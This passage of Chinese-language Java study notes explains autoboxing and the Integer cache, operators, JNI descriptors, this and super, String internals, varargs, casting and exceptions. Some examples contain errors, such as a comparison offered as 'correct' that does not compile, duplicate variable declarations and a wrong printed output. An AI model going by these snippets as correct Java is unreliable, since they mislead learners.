Integer(1);\n```\n这种语法是可以通过编译的。但是，Java作为一种强类型的语言，对象直接赋值给引用类型变量，而基础数据只能赋值给基本类型变量，这个是毫无异议的。那么基本类型和包装类型为什么可以直接相互赋值呢？这其实是Java中的一种“语法糖”。“语法糖”是指计算机语言中添加的某种语法，这种语法对语言的功能并没有影响，但是更方便程序员使用。通常来说使用语法糖能够增加程序的可读性，从而减少程序代码出错的机会（来自百度百科）。换句话说，这其实是一种障眼法，那么实际上是怎么样的呢？下面是Integer a = 1;语句编译的字节码。\n```\n0: iconst_1\n1: invokestatic  #2                  // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;\n4: astore_1\n```\n首先，生成一个常量1，然后调用Integer.valueOf(int)方法返回Integer对象，最后将对象的地址（引用）赋值给变量a。Integer a = 1;其实相当于Integer a = Integer.valueOf(1);。\n\n其他的包装类都是类似的，下表是所有包装类中的类型转换方法。\n\n| 包装类    | 基本类型转包装类          | 包装类转基本类型               |\n| --------- | ------------------------- | ------------------------------ |\n| Byte      | Byte.valueOf(byte)        | byteInstance.byteValue()       |\n| Short     | Short.valueOf(short)      | shortInstance.shortValue()     |\n| Integer   | Integer.valueOf(int)      | integerInstance.intValue()     |\n| Long      | Long.valueOf(long)        | longInstance.longValue()       |\n| Float     | Float.valueOf(float)      | floatInstance.floatValue()     |\n| Double    | Double.valueOf(double)    | doubleInstance.doubleValue()   |\n| Character | Character.valueOf(char)   | charInstance.charValue()       |\n| boolean   | Boolean.valueOf(booleann) | booleanInstance.booleanValue() |\n\n\n## “莫名其妙”的NullPointException\n在笔者开发经历中，碰到过不少因为请求参数或者接口定义字段设置为int（或者其他基本类型）而导致NullPointException。代码大致地运行步骤如下所示，当然不会跟这个完全一样。\n```java\nInteger a = null;\n...\nint b = a; // 抛出NullPointException\n```\n上面的代码可以编译通过，但是会抛出空指针异常（NullPointException）。前面已经说过了，int b = a实际上是int b = a.intValue()，由于a的引用值为null，在空对象上调用方法就会抛出NullPointException。\n\n## 两个包装类引用相等性(享元模式)\n在Java中，“==”符号判断的内存地址所对应的值得相等性，具体来说，基本类型判断值是否相等，引用类型判断其指向的地址是否相等。看看下面的代码，两种类似的代码逻辑，但是得到截然不用的结果。\n```java\nInteger a1 = 1;\nInteger a2 = 1;\nSystem.out.println(a1 == a2); // true\n\nInteger b1 = 222;\nInteger b2 = 222;\nSystem.out.println(b1 == b2); // false\n\nInteger c1 = new Integer(1);\nInteger c2 = 1;\nSystem.out.println(c1 == c2); // false\n\nInteger d1 = new Integer(1);\nInteger d2 = new Integer(1)\nSystem.out.println(d1 == d2); // false\n```\n这个必须从源代码中才能找到答案。Integer类中的valueOf()方法的源代码如下：\n```java\npublic static Integer valueOf(int i) {\n    if (i >= IntegerCache.low && i <= IntegerCache.high) // 判断实参是否在可缓存范围内，默认为[-128, 127]\n        return IntegerCache.cache[i + (-IntegerCache.low)]; // 如果在，则取出初始化的Integer对象\n    return new Integer(i); // 如果不在，则创建一个新的Integer对象\n}\n```\n由于1属于[-128, 127]集合范围内，所以valueOf()每次都会取出同一个Integer对象，故第一个“”判断结果为true；而222不属于[-128, 127]集合范围内，所以valueOf()每次都会创建一个新的Integer对象，由于两个新创建的对象的地址不一样，故第一个“”判断结果为false。\n\n# 基本类型及引用类型的大小比较问题\n## 基本类型的比较\n直接使用`>`、`>=`、`<`、`<=`、`==`即可；\n\n## 引用类型的比较\n### 非Integer类型\n#### 非等于比较\n\n**非Integer引用类型使用>、>=、<、<=会报错,**。如下：\n\n```java\nString a = \"ac\";\nString b = \"dd\"\nif(a > b){ //会报错, 说不支持>操作符\n  System.out.println(\"jfkdfj\");\n}\n\n```\n我们应该使用使用Comparable接口中的compareTo() 方法进行比较或使用 Comparator接口中的compare()方法进行比较。\n正确的比较方法：\n```java\nString a = \"ac\";\nString b = \"dd\"\nif(a.compareTo(b)){ \n  System.out.println(\"jfkdfj\");\n}\n```\n\n#### 等于比较\n引用类型使用==时，是比较的对象地址。而不是调用equals或compareTo方法。Integer类型也是如此,但是Integer有享元模式\n```java\nclass Person{\n  public boolean equals(Object object){return true;}\n}\npublic class Te {\n  public static void main(String[] args) throws Exception{\n    Person a = new Person();\n    Person b = new Person();\n    System.out.println(a==b);//false\n  }\n}\n```\n\n### Integer类型\n#### 等于比较\n- 两个Integer类型进行`==`比较, 比较的是Integer对象地址，但是需要注意的是有享元模式，即通过Integer.valueOf()获取到的对象可能是已存在的对象。Integer.valueOf()源码如下：\n```java\npublic static Integer valueOf(int i) {    \n    if(i >= -128 && i <= IntegerCache.high)    \n        return IntegerCache.cache[i + 128];    \n    else    \n        return new Integer(i);    \n}    \n```\n可以看到Integer有个缓冲数组IntegerCache.cache, 如果value值在-128到127之间时，直接返回固定的对象引用。但是超过这个范围，就会创建一个新的Integer对象。\n\n- 但是如果Integer类型与基本类型int进行`==`比较时，Integer类型会使用`intValue()`方法拆箱成基本数据类型, 即比较的是value\n\n例子：\n```java\nInteger i = new Integer(100); // 创建新的对象\nInteger j = new Integer(100); // 创建新的对象\nSystem.out.println(i==j);  // false\n\nInteger i = 100; // 会调用Integer.value(100)方法，100在-128到127之间，返回固定的对象引用\nInteger j = new Integer(100);  // 创建新的对象\nSystem.out.println(i==j);  // false\n\nInteger i = 100; // 会调用Integer.value(100)方法，100在-128到127之间，返回固定的对象引用\nInteger j = 100;  // 会调用Integer.value(100)方法，100在-128到127之间，返回固定的对象引用\nSystem.out.println(i==j);  // true\n\nInteger i = Integer.valueOf(100); // 100在-128到127之间，返回固定的对象引用\nInteger j = 100;  // 会调用Integer.value(100)方法，100在-128到127之间，返回固定的对象引用\nSystem.out.println(i==j);  // true\n\nInteger i = Integer.valueOf(100); // 100在-128到127之间，返回固定的对象引用\nInteger j = Integer.valueOf(100);  // 100在-128到127之间，返回固定的对象引用\nSystem.out.println(i==j);  // true\n\nint i = 100;\nInteger j = new Integer(100);  // 创建新的对象\nSystem.out.println(i==j);  // ture (因为j会使用intValue()犯法拆箱成基本数据类型)\n```\n\n重中之中：\n```\nMap<String, Integer> map1 = new HashMap<>();\nMap<String, Integer> map2 = new HashMap<>();\nmap1.put(\"a\", 11);\nmap2.put(\"a\", 11);\nSystem.out.println(map1.get(\"a\") == map2.get(\"a\")); // true\nmap1.put(\"b\", 1000);\nmap2.put(\"b\", 1000);\nSystem.out.println(map1.get(\"b\") == map2.get(\"b\")); // false, 而这个就是我们容易犯的错误\nSystem.out.println(map1.get(\"b\").equals(map2.get(\"b\"))); // true\n```\n\n#### 非等与比较\n`>, >=, <, <=` 比较的是value, 因为Integer在遇到不等于比较时会使用`intValue()`方法拆箱成基本数据类型\n\n例子：\n```java\nInteger i = new Integer(100);\nInteger i = new Integer(50);\nSystem.out.println(i > j);  // true\n```\n\n```java\nInteger i = 100;\nInteger i = new Integer(50);\nSystem.out.println(i > j);  // true\n```\n\n\n# &和&&区别(位运算、逻辑运算、短路运算)\n首先&运算符有两种用法：一种是位运算符，另一种是逻辑运算符\n而&&是短路运算符，逻辑与跟短路与的差别是非常巨大的，虽然二者都要求运算符左右两端的布尔值都是true整个表达式的值才是true。&&之所以称为短路运算，是因为如果&&左边的表达式的值是false，右边的表达式会被直接短路掉，不会进行运算。而逻辑运算符一定是会把两端都算一边\n注意：`|`的`||`的区别也是如此\n```java\npublic static void main(String[] args){\n  int a = 10;\n  int b =1;\n  System.out.println(a > 1 | ++b >= 2);//true\n  System.out.println(b); //2\n}\n```\n\n# JNI字段描述符基础知识\n```java\nint[] a = {1};\nInteger[] b = {1};\nSystem.out.println(a.getClass().getName()); // 输出：[I\nSystem.out.println(b.getClass().getName()); // 输出：[Ljava.lang.Integer;\n```\n上述的`[I`与`[Ljava.lang.Integer`就是*JNI字段描述符【Java Native Interface FieldDescriptors】*，它是一种对 Java 数据类型、数组、方法的编码。此外，在 Android 逆向分析中，通过反汇编得到的 smali 文件，里面的代码也会遵循这种方式，即 Dalvik 字节码。本文就记录一些数据类型、数组、方法的编码方式以及解释说明，方便以后查阅。\n\n**基本概念**\n这种编码方式把 Java 中的基本数据类型、数组、对象都使用一种规范来表示：\n- 八种基本数据类型都使用一个大写字母表示\n- void 使用 V 表示\n- 数组使用左方括号表示\n- 方法使用一组圆括号表示，参数在括号里，返回类型在括号右侧\n- 对象使用 L 开头，分号结束，中间是类的完整路径，包名使用正斜杠分隔\n- 基本编码\n\n**基本编码如下表格，并配有解释说明：**\n| Java 类型            | JNI 字段描述符                                                                                                                                             |\n| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| boolean              | Z                                                                                                                                                          |\n| byte                 | B                                                                                                                                                          |\n| char                 | C                                                                                                                                                          |\n| short                | S                                                                                                                                                          |\n| int                  | I                                                                                                                                                          |\n| long                 | J                                                                                                                                                          |\n| float                | F                                                                                                                                                          |\n| double               | D                                                                                                                                                          |\n| void                 | V                                                                                                                                                          |\n| 引用类型(包括包装类) | 以 L 开头，以；结尾，中间是使用 / 隔开的完整包名、类型。例如：Ljava/lang/String;。如果是内部类，添加 $符号分隔，例如：Landroid/os/FileUtils$FileStatus;。 |\n| 数组                 | [                                                                                                                                                          |\n| 方法                 | 使用 () 表示，参数在圆括号里，返回类型在圆括号右侧，例如：(II) Z，表示 boolean func (int i,int j)。                                                        |\n\n**举例说明**\n**数据类型**\n- `[I`：表示 int 一维数组，即 `int[]`。\n- `[Ljava/lang/Integer`：表示Integer一维数组，即`Integer[]`\n- `[[I`:表示 int 二维数组，即 `int[][]`。\n- `Ljava/lang/String`;：表示 String 类型，即 java.lang.String。\n- `[Ljava/lang/Object`;：表示 Object 一维数组，即 `java.lang.Object[]`。\n- Z：表示 boolean 类型。\n- V：表示 void 类型。\n\n**方法**\n- () V：表示参数列表为空，返回类型为 void 的方法，即 void func ()。\n- (II) V：表示参数列表为 int、int，返回类型为 void 的方法，即 void func (int i,int j)。\n- (Ljava/lang/String;Ljava/lang/String;) I：表示参数列表为 String、String，返回类型为 int 的方法，即 int func (String i,String j)。\n- ([B) V：表示参数列表为 byte []，返回类型为 void 的方法，即 void func (byte [] bytes)。\n- (ILjava/lang/Class;) J：表示参数列表为 int、Class，返回类型为 long 的方法，即 long func (int i,Class c)。\n\n# 实参与形参\n- 形参出现在函数定义中，在整个函数体内都可以使用， 离开该函数则不能使用。\n- 实参出现在主调函数中，进入被调函数后，实参变量也不能使用。 \n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131057.png)\n\n# 成员变量(域)与局部变量\n- 成员变量有2次初始化的机会，第一次是在“准备阶段”，执行系统初始化，对类变量设置零值，另一次则是在“初始化”阶段，赋予程序员在代码中定义的初始值\n- 和成员变量初始化不同的是，局部变量不存在系统初始化过程，这意味着一旦定义了局部变量则必须要人为的初始化，否则无法使用\n```java\npublic void test(){\n  int i;\n  System.out.println(i);\n}\n```\n这样的代码是错误的\n但注意：局部变量数组new后，会默认进行初始化：\n```java\npublic class Te {\n  public static void main(String[] args) {\n    Test t = new Test();\n    t.test();\n  }\n}\nclass Test{\n  public void test(){\n    int[] arr = new int[4];\n    System.out.println(Arrays.toString(arr)); //输出：[0, 0, 0, 0]\n  }\n}\n```\n\n# 类变量与全局变量\n**类变量**\n类变量也称为静态变量，是和类关联在一起，随着类的加载而加载，他们称为类数据在逻辑上的一部分。\n类变量被类的所有实例共享，即使没有类实例时你也可以访问它, 如下，null能访问count\n```java\npublic class Test{\n  public static void main(String[] args){\n    Order order = null;\n    oder.hello();\n    System.out.println(order.count);  // 输出：1\n  }\n}\nclass Order{\n  public static int count = 1; \n  public static void hello(){\n    System.out.println(\"hello:\");\n  }\n}\n```\n\n**全局常量**\n声明为`static final`的变量称为全局常量，此时与类变量不同的是，全局常量在编译成class文件就将其赋值了\n如下:\n```java\npublic class Math{\n  public static int a = 1; \n  public static final int b = 1; \n\n  public static void main(String[] args){\n    \n  }\n}\n```\n其字节码文件\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131109.png)\n\n# final与static final的区别\n当使用final修饰变量时，该变量只能在定义处、静态代码块、构造函数中赋值\n当使用static final修饰变量时，该变量只能在定义处、静态代码块中赋值\n\n# java中||与&&优先级问题\n首先，程序中的优先级和执行顺序是两个不同的概念。\n\n代码示例\n```java\nint a1 = 10;\nint a2 = 20;\nSystem.out.println(a1 < a2 || ++a1 > a2 && ++a2 < a1);\nSystem.out.println(a1);\nSystem.out.println(a2);\n```\n\n输出：\n```txt\ntrue\n10\n20\n```\n\n可见程序只对`a1 < a2`进行了评估。\n\n解释: 我们知道Java中&&的优先级高于||，所以\n```java\ntrue || false && false\n```\n在Java中相当于：\n```java\ntrue || (false && false)\n```\n但是，这并不意味着程序会先执行括号中的内容。\n\n由于Java语言的执行顺序是从左到右，所以如果上述的布尔值是表达式的话，则会先计算左边表达式的内容，这叫执行顺序（或评估顺序）。\n\n# this和super的用法总结\n## this\nthis 是自身的一个对象，代表对象本身，可以理解为：指向对象本身的一个指针。\nthis 的用法在 Java 中大体可以分为3种：\n1. **普通的直接引用**\n这种就不用讲了，this 相当于是指向当前对象本身。\n\n2. **形参与成员名字重名，用 this 来区分** \n```java\nclass Person {\n    private int age = 10;\n    public Person(){\n      System.out.println(\"初始化年龄：\"+age);\n    }\n    public int GetAge(int age){\n        this.age = age;\n        return this.age;\n    }\n}\n \npublic class test1 {\n    public static void main(String[] args) {\n        Person Harry = new Person();\n        System.out.println(\"Harry's age is \"+Harry.GetAge(12));\n    }\n}\n```\n运行结果：\n```\n初始化年龄：10\nHarry's age is 12\n```\n可以看到，这里 age 是 GetAge 成员方法的形参，this.age 是 Person 类的成员变量。\n\n3. **引用构造函数**\nthis(参数)：调用本类中另一种形式的构造函数（应该为构造函数中的第一条语句）。\n\n## super\nsuper 可以理解为是指向自己超（父）类对象的一个指针，而这个超类指的是离自己最近的一个父类。\nsuper 也有三种用法：\n1. **普通的直接引用**\n与 this 类似，super 相当于是指向当前对象的父类，这样就可以用 super.xxx 来引用父类的成员。\n\n2. **子类中的成员变量或方法与父类中的成员变量或方法同名**\n```java\nclass Country {\n    String name;\n    void value() {\n       name = \"China\";\n    }\n}\n  \nclass City extends Country {\n    String name;\n    void value() {\n        name = \"Shanghai\";\n        super.value();      //调用父类的方法\n        System.out.println(name);\n        System.out.println(super.name);\n    }\n  \n    public static void main(String[] args) {\n        City c=new City();\n        c.value();\n    }\n}\n```\n运行结果：\n```txt\nShanghai\nChina\n```\n\n可以看到，这里既调用了父类的方法，也调用了父类的变量。若不调用父类方法 value()，只调用父类变量 name 的话，则父类 name 值为默认值 null。\n3. **引用构造函数**\nsuper(参数)：调用父类中的某一个构造函数（应该为构造函数中的第一条语句）。\n\n## super 和 this的异同\n- **有参构造器的第一条语句，不会隐含地调用this();**\n- 调用super()必须写在子类构造方法的第一行，否则编译不通过。**每个子类构造方法的第一条语句，都是隐含地调用super()**，如果父类没有这种形式的构造函数，那么在编译的时候就会报错。\n- super() 和 this() 只能放在构造方法内第一行。\n- this 和 super 不能同时出现在一个构造函数里面，因为this必然会调用其它的构造函数，其它的构造函数必然也会有 super 语句的存在，所以在同一个构造函数里面有相同的语句，就失去了语句的意义，编译器也不会通过\n- this() 和 super() 都指的是对象，所以，均不可以在 static 环境中使用。包括：static 变量,static 方法，static 语句块。\n- 从本质上讲，this 是一个指向本对象的指针, 然而 super 是一个 Java 关键字\n```java\nclass Person {\n\tPerson(){\n\t\tSystem.out.println(\"Person无参构造\");\n\t}\n\tPerson(String name){\n\t\tSystem.out.println(\"Person有参构造\");\n  }\n}\nclass Student extends Person {\n  Student(){\n\t\tSystem.out.println(\"Student无参构造\");\n  }\n  Student(String name){\n\t\tSystem.out.println(\"Student有参构造\");\n  }\n}\npublic class Te {\n  public static void main(String[] args) {\n    Person p = new Person(\"whz\");\n    System.out.println(\"******\");\n    Student s = new Student(\"whz\");\n    System.out.println(\"******\");\n    Student s1 = new Student();\n  }\n}\n```\n运行结果：\n```\nPerson有参构造\n******\nPerson无参构造\nStudent有参构造\n******\nPerson无参构造\nStudent无参构造\n```\n\n# String与StringBuffer\n## String\n- String是final类，是不可继承的\n- String实现了Serializable接口，表示字符串是支持序列化的\n- String实现了Comparable接口，表示String可以表示大小\n\n定义字符串的两种方式：\n- String s1 = \"whz\";  // 字面量的定义方式\n- String s2 = new String(\"whz\"); \n\n### String存储结构的变更\nString在jdk8及以前内部是用`final char[] value`来存储字符串数据的。但在jdk9之后改为`byte[]`来存储数据，与String相关的类，例如AbstractStringBuilder, StringBuilder, StringBuffer都做了这个改变\n这样做的原因如下：\n众所周知，在大多数Java程序的堆里，String占用的空间最大，并且绝大多数String只有Latin-1字符，这些Latin-1字符只需要1个字节就够了。JDK9之前，JVM因为String使用char数组存储，每个char占2个字节，所以即使字符串只需要1字节/字符，它也要按照2字节/字符进行分配，浪费了一半的内存空间。\n\nJDK9是怎么解决这个问题的呢？\n一个字符串出来的时候判断，它是不是只有Latin-1字符，如果是，就按照1字节/字符的规格进行分配内存，如果不是，就按照2字节/字符的规格进行分配（UTF-16编码），提高了内存使用率\n\n### String的不可变性\n- 当对字符串重修赋值时，需要重写指定内存区域赋值，不能使用原有的value进行赋值\n- 对现有的字符串进行连接操作时，也需要重写指定内存区域赋值，不能使用原有的value进行赋值\n- 当调用string的replace()方法修改指定字符或字符串时，也需要重新指定内存区域赋值，不能使用原有的value进行赋值\n\n通过字面量的方式(区别于new)给一个字符串赋值，此时的字符串值声明在字符串常量池中\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131122.png)\n\n### String底层Hashtable结构\n<font color=\"red\">String的字符串常量池是一个固定大小的HashTable</font>, 默认值大小长度是1009。如果放进字符串常量池的String非常多，就会造成Hash冲突严重，从而导致链表会很长，而链表长了后直接会造成的影响就是当调用String.intern时性能会大幅下降\n使用`-XX:StringTableSize`可设置StringTable的长度\n\n### 字符串拼接操作\n- 常量与常量的拼接结果在字符串常量池中，原理是编译器优化\n- 字符串常量池中是不会存在相同内容的常量\n- 只要其中一个是变量，则相当于在堆空间中new String(), 结果就在堆中。变量拼接的原理是使用StringBuilder来new String后append()\n- 如果拼接的结果调用intern()方法，则主动将常量池中还没有的字符串对象放入字符串常量池中，并返回次对象地址\n```java\npublic static void test1(){\n  String s1 = \"a\" + \"b\" + \"c\";\n  String s2 = \"abc\";\n  System.out.println(s1 == s2); // true\n  System.out.println(s1.equals(s2)); // true\n}\n```\n```java\npublic static void test2(){\n  String s1 = \"javaee\";\n  String s2 = \"hadoop\";\n\n  String s3 = \"javaeehadoop\";\n  String s4 = s1 + \"hadoop\";\n  String s5 = \"javaee\" + \"hadoop\";\n\n  System.out.println(s3 == s4); // false\n  System.out.println(s3 == s5); // true\n  System.out.println(s4 == s5); // false\n}\n```\n\n### new String(\"ab\")创建几个对象\n最多创建两个对象：一个是new关键字在堆空间创建的， 如果字符串常量池中有\"ab\", 则不许创建对象，如果没有，则会在字符串常量池中创建一个\n\n### intern()\n`str.intern()`用来判断字符串常量池中是否存在str字符串，如果存在，则返回字符串常量池中str字符串的地址，反之，则在字符串常量池中加载一份str字符串，并返回该地址\n```java\npublic static void test3(){\n  String s1 = \"javaee\";\n  String s2 = \"ee\";\n  String s3 = \"java\" + s2;\n  String s4 = s3.intern();\n  String s5 = new String(\"javaee\").intern();\n\n  System.out.println(s4 == s1); //true\n  System.out.println(s5 == s1); //true\n}\n```\n对于上述的`String s5 = new String(\"javaee\").intern()`，会先在堆中创建一个\"javaee\"的string对象，然后判断字符串常量池中是否有\"javaee\"的字符串，如果有，则返回该地址给s5，反之，则在字符串常量池中创建一个“javaee”字符串，并返回该地址给s5\n\n### String中的hashCode()\n```java\npublic static void main(String[] args){\n  String a = new String(\"aa\");\n  String b = new String(\"aa\");\n  System.out.println(a == b); //false\n  System.out.println(a.hashCode() == b.hashCode()); //true\n\n  String[] c = new String[]{\"aa\"};\n  String[] d = new String[]{\"aa\"};\n  System.out.println(c == d); //false\n  System.out.println(c.hashCode() == d.hashCode()); //flase\n}\n```\n\n# Varargs 可变参数使用\nJava1.5提供了一个叫varargs的新功能，就是可变长度的参数。可变参数底层就是一个数组\n\"Varargs\"是\"variable number of arguments\"的意思。有时候也被简单的称为\"variable arguments\"\n定义实参个数可变的方法：只要在一个形参的\"类型\"与\"参数名\"之间加上三个连续的\".\"（即\"...\"，英文里的句中省略号），就可以让它和不确定个实参相匹配。\n以下实例创建了 sumvarargs() 方法来统计所有数字的值：\n```java\npublic class Te {\n  public static void main(String[] args) {\n    get(1);// 传入一个实参\n    System.out.println(\"****\");\n    get(2,3); //传入多个实参\n    System.out.println(\"****\");\n    get(new int[]{4,2}); // 传入一个数组\n  }\n\n  public static void get(int... arr){\n    for(int i = 0; i < arr.length; i++)\n      System.out.println(arr[i]);\n  }\n}\n```\n\n## 泛型可变参数\n泛型类型为可变参数数组中元素的类型\n\n当使用泛型可变参数时；传入数组会有如下两种情况：\n- 情况一：当数组的元素的类型是引用类型时：数组实参的引用直接赋给形参，此时泛型类型为数组实参中元素的类型\n```java\npublic static void main(String[] args) throws Exception{\n  Integer[] nums = {3, 30, 34, 5, 9};\n  test(nums); //此时泛型类型为Integer\n}\npublic static <T> void test(T... a){\n  System.out.println(a.length); //输出：5\n  System.out.println(a[0].getClass().getName());//输出：java.lang.Integer;\n  System.out.println(a.getClass().getName());//输出：[Ljava.lang.Integer;\n}\n```\n- 情况二：当数组的元素的类型是基本类型时，<font color=\"red\">由于泛型不支持基本类型</font>，所以不能将数组实参的引用直接赋给形参，而是将数组实参作为一个元素存放到可变形参中，此时可变形参为一个该基本类型的二维数组， 所以泛型类型为该基本类型的数组\n```java\npublic static void main(String[] args) throws Exception{\n  int[] nums = {3, 30, 34, 5, 9};\n  test(nums); //此时泛型类型为int[]\n}\npublic static <T> void test(T... a){\n  System.out.println(a.length); // 输出：1\n  System.out.println(a[0].getClass().getName()); //输出：[I\n  System.out.println(a.getClass().getName()); //输出：[[I\n}\n```\nArrays中的asList()方法就是为`static <T> List<T> asList(T... a)`\n所以我们可以进行如下操作\n```java\nint[] nums = {3, 30, 34, 5, 9};\nList<int[]> list = Arrays.asList(nums);\n```\n\n# 引用类型之间的转换\n<span id=\"convert\"></span>\n\n## 子类与父类之间的转换\n### 子类转父类\njava中子类转换父类,实际上依然是子类；此时不需要强制转换。 但引用只能调用父类中定义的方法和变量；但如果子类中重写了父类中的一个方法，那么在调用这个方法的时候，将还是会调用子类中的这个方法；\n```java\nclass Animal{\n  public void call(){\n    System.out.println(\"Animal\");\n  }\n}\n\nclass Dog extends Animal{\n  public void call(){\n    System.out.println(\"Dog\");\n  }\n}\n\npublic static void test9(){\n  Animal dog = new Dog();\n  dog.call();\n}\n```\n输出\n```\nDog\n```\n\n### 父类转子类\n只有满足`父类实例 instanceof 子类`，才能实现父类转子类，即只有父类对象本身就是用子类new出来的时候, 才可以在将来被强制转换为子类对象。但仍需要强制转换,否则会报错\n```java\n// Base是Derived的父类\nBase derivedInstance = new Derived();\nBase baseInstance = new Base();\n\nDerived good = (Derived)derivedInstance; // OK\nDerived fail = (Derived)baseInstance; // Throws InvalidCastException\n```\n\n```java\nclass Animal{\n  public void call(){\n    System.out.println(\"Animal\");\n  }\n}\n\nclass Dog extends Animal{\n  public void call(){\n    System.out.println(\"Dog\");\n  }\n}\n\npublic static void test9(){\n  Animal dog = new Dog();\n  if(dog instanceof Dog){\n    Dog dog1 = (Dog) dog;\n    dog1.call();\n  }\n}\n```\n\n例题1:\n```java\nObject[] a = new Object[3];\nSystem.out.println(a instanceof Object[][]); // false\nObject[][] b = (Object[][]) a;\n```\n以上会正常编译，因为Object[]是Object[][]的父类。但不会正常运行，因为a本身不是用Object[][]创建出来的\n\n例题2:\n```java\nObject[] a = new Object[3][3];\nSystem.out.println(a instanceof Object[][]); // true\nObject[][] b = (Object[][]) a;\n```\n以上会正常编译，因为Object[]是Object[][]的父类。且也会正常运行，因为a本身是用Object[][]创建出来的\n\n例题3:\n```java\nInteger[] a = new Integer[3];\nInteger[][] b = (Integer[][]) a;\n```\n以上不会正常编译，因为Integer[]不是Integer[][]的父类。\n\n例题4: \n```java\nObject a = new int[2];\nSystem.out.println(a instanceof int[]); // true\nint[] b = (int[]) a;\n```\n以上会正常编译，因为Object是int[]的父类。且也会正常运行，因为a本身是用int[]创建出来的\n\n## instanceof的作用\n`A instanceof B`的作用：\n假设A对象是由C类new出来的，则该语句的作用是判断C类实例是否是B的实例或者是B的子类的实例\n```java\nclass Animal{\n  public void call(){\n    System.out.println(\"Animal\");\n  }\n}\n\nclass Dog extends Animal{\n  public void call(){\n    System.out.println(\"Dog\");\n  }\n}\n\npublic static void test9(){\n  Animal dog = new Dog();\n  System.out.println(dog instanceof Dog); // 输出：true\n\n  Animal dog = new Animal();\n  System.out.println(dog instanceof Dog); // 输出：false\n}\n```\n\n## 有关数组之间的强转\n```java\npublic void test(){\n  Object[] ob = new String[]{\"aa\", \"cc\"};\n  if(ob instanceof String[]){\n    System.out.println(\"能强转成String[]\");\n    String[] str = (String[])ob;\n  }else{\n    System.out.println(\"不能强转成String[]\");\n  }\n}\n```\n注：\n```java\npublic void test(){\n  List<String> list = new ArrayList();\n  list.add(\"jaaa\");\n  list.add(\"jfkdfj\");\n  list.add(\"lala\");\n\n  Object[] ob = list.toArray();\n  if(!(ob instanceof String[])){\n    System.out.println(\"不能强转成String[]\");\n  }\n}\n```\n可知`String[] ob = (String[])list.toArray()`会报错\n如果想要实现List转成String类型的数组，可以的使用List中的`<T> T[] toArray(T[] a)`方法,如下\n```java\npublic void test(){\n  List<String> list = new ArrayList();\n  list.add(\"jaaa\");\n  list.add(\"jfkdfj\");\n  list.add(\"lala\");\n\n  String[] str = list.toArray(new String[0]);\n```\n\n## 类型转换后引用地址不变\n```java\nObject[] a = new Integer[1];\na[0] = 1;\nInteger[] b = (Integer[]) a;\nb[0] = 2;\nSystem.out.println(a[0]); // 2\nSystem.out.println(System.identityHashCode(a)); // 1856056345\nSystem.out.println(System.identityHashCode(b)); // 1856056345\n\nObject[][] a1 = new Integer[1][1];\na1[0][0] = 1;\nInteger[] b1 = (Integer[]) a1[0];\nb1[0] = 2;\nSystem.out.println(a1[0][0]); // 2\nSystem.out.println(System.identityHashCode(a1)); // 1778535015\nSystem.out.println(System.identityHashCode(b1)); // 1778535015\n\nInteger[] a2 = new Integer[1];\na2[0] = 1;\nObject[] b2 = a2;\nb2[0] = 2;\nSystem.out.println(a2[0]); // 3\nSystem.out.println(System.identityHashCode(a2)); // 24433162\nSystem.out.println(System.identityHashCode(b2)); // 24433162\n\nObject a3 = new int[2];\nint[] b3 = (int[]) a3;\nSystem.out.println(System.identityHashCode(a3)); // 1725097945\nSystem.out.println(System.identityHashCode(b3)); // 1725097945\n```\n\n# 接口多继承\n- 一个类只能extends一个父类，但可以implements多个接口\n- 一个接口则可以同时extends多个接口，却不能implements任何接口\n\n===>> Java中的接口是支持多继承的。\n\n# 检查异常、非检查异常、运行时异常、非运行时异常的区别\n- Java把所有的非正常情况分为两种：异常（Exception）和错误（Error），它们都继承Throwable父类。\n- Java的异常（Exception和Error）分为检查异常和非检查的异常。\n- 其中根据Exception异常进行分类，可分为运行时异常和非运行时异常。\n\nJava异常体系结构如下图所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409103127.png)\n\n## Error\n一般是指java虚拟机相关的问题，如系统崩溃、虚拟机出错误、动态链接失败等，这种错误无法恢复或不可能捕获，将导致应用程序中断，通常应用程序无法处理这些错误，因此应用程序不应该捕获Error对象，也无须在其throws子句中声明该方法抛出任何Error或其子类。\n\n## 检查异常于非检查异常\nJava的异常（Exception和Error）分为检查异常和非检查的异常。\n\n### 检查异常\n就是编译器要求你必须处理的异常。比如我们在编程某个文件的读于写时，编译器要求你必须要对某段代码try....catch... 或者 throws exception，这就是检查异常，简单的来说，你代码还没有运行，编码器就会检查你的代码，对可能出现的异常必须做出相对的处理。（比如当文件不存在时..）\n\n#### 如何处理检查异常\n1. 继续往上抛出，（这是一个消极的方法），一直可以抛到java虚拟机来处理，通过throw exception抛出。\n2. 用try...catch捕获\n\n> 对于检查时的异常必须处理，或者必须捕获或者必须抛出\n\n#### 检查异常大概有哪些\n除了RuntimeException与其派生类(子类),以及错误(Error)。其他的差不多都是检查异常。\n\n### 非检查异常\n编译器不要求强制处置的异常，虽然有可能出现错误，但是我不会在编译的时候检查。\n\n#### 如何处理非检查异常\n1. try....catch捕获\n2. 继续抛出\n3. 不处理\n\n这类异常一般我们是不处理的，因为会很判断会出现什么问题，而且有些异常你也无法运行时处理，比如空指针。\n\n#### 非检查异常有哪些\nRuntimeException与其子类，以及错误(Error)\n\n## 运行时异常和非运行时异常\n其中根据Exception异常进行分类，可分为运行时异常和非运行时异常。\n\n### 运行时异常\n都是RuntimeException类及其子类异常，如NullPointerException(空指针异常)、IndexOutOfBoundsException(下标越界异常)等，这些异常是非检查异常，程序中可以选择捕获处理，也可以不处理。这些异常一般是由程序逻辑错误引起的，程序应该从逻辑角度尽可能避免这类异常的发生。\n\n运行时异常的特点是Java编译器不会检查它，也就是说，当程序中可能出现这类异常，即使没有用try-catch语句捕获它，也没有用throws子句声明抛出它，也会编译通过\n\n### 非运行时异常\n是RuntimeException以外的异常，类型上都属于Exception类及其子类。从程序语法角度讲是必须进行处理的异常，如果不处理，程序就不能编译通过。如IOException、SQLException等以及用户自定义的Exception异常，一般情况下不要自定义检查异常。\n\n# finally关键字\n来看看下面这个test1()方法：\n```java\npublic int test1() {\n  try {\n    return 1;\n  } finally {\n    return 2;\n  }\n}\n```\n方法test1将返回2；\n\n怎么解释呢？再来看看下面这个test2()方法：\n```java\npublic int test2() {\n  int i = 1;\n  try {\n    System.out.println(\"try语句块中\");\n    return 1;\n  } finally 